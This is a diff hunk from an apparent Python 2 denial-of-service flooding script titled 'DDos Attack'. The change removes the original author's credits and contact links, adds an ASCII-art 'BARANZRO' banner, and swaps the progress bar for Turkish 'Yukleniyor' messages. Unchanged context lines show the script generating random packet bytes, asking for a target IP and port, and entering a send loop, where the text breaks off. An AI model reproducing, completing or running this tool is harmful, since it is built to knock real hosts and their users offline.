@@ -20,25 +20,29 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "Author   : HA-MRX"
-print "You Tube : https://www.youtube.com/c/HA-MRX"
-print "github   : https://github.com/Ha3MrX"
-print "Facebook : https://www.facebook.com/muhamad.jabar222"
+print "     ____          _____            _   _ ___________   ___   "
+print "    |  _ \   /\   |  __ \     /\   | \ | |___  /  __ \ / _ \  "
+print "    | |_) | /  \  | |__) |   /  \  |  \| |  / /| |__) | | | | "
+print "    |  _ < / /\ \ |  _  /   / /\ \ | . ` | / / |  _  /| | | | "
+print "    | |_) / ____ \| | \ \  / ____ \| |\  |/ /__| | \ \| |_| | "
+print "    |____/_/    \_\_|  \_\/_/    \_\_| \_/_____|_|  \_\\___/  "
+print "                                                              "
+
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
 os.system("figlet Attack Starting")
-print "[                    ] 0% "
+print "Yukleniyor"
 time.sleep(5)
-print "[=====               ] 25%"
+print "Yukleniyor. "
 time.sleep(5)
-print "[==========          ] 50%"
+print "Yukleniyor.. "
 time.sleep(5)
-print "[===============     ] 75%"
+print "Yukleniyor... "
 time.sleep(5)
-print "[====================] 100%"
+print "Yukleniyor.... "
 time.sleep(3)
 sent = 0
 while True:
